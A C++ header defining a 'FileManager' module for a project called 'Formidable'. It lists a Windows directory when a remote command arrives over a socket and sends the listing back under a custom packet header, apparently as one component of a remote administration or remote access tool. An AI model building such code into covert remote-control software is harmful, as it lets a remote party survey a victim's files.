#ifndef FILE_MANAGER_MODULE_H
#define FILE_MANAGER_MODULE_H
#include "../../Common/Module.h"
#include <windows.h>
#include <sstream>
#include <vector>
namespace Formidable {
    class FileManagerModule : public IModule {
    public:
        std::string GetModuleName() override { return "FileManager"; }
        void Execute(SOCKET s, CommandPkg* pkg) override {
            if (pkg->cmd == CMD_FILE_LIST) {
                std::string path = pkg->data;
                if (path.empty()) path = "C:\\*";
                else path += "\\*";
                std::string result = ListFiles(path);
                PkgHeader header;
                memcpy(header.flag, "FRMD26?", 7);
                header.originLen = (int)result.size();
                header.totalLen = sizeof(PkgHeader) + header.originLen;
                send(s, (char*)&header, sizeof(PkgHeader), 0);
                send(s, result.c_str(), (int)result.size(), 0);
            }
        }
    private:
        std::string ListFiles(const std::string& path) {
            std::stringstream ss;
            WIN32_FIND_DATAA findData;
            HANDLE hFind = FindFirstFileA(path.c_str(), &findData);
            if (hFind == INVALID_HANDLE_VALUE) return "Directory not found.";
            do {
                ss << (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ? "[DIR] " : "      ")
                   << findData.cFileName << "\n";
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
            return ss.str();
        }
    };
}
#endif // FILE_MANAGER_MODULE_H
